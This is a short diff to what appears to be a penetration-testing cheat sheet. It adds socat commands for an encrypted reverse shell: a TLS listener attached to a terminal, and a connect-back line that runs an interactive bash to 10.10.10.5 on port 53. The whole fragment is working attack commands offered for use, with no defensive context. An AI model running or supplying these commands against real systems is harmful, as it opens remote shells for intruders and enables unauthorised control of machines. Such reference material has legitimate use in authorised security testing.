@@ -34,9 +34,11 @@ cat shell.key shell.crt > shell.pem
 
 # Setup reverse shell listener :
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
 
 # Connect back
 socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane
 
 # Binding mode
 - Target
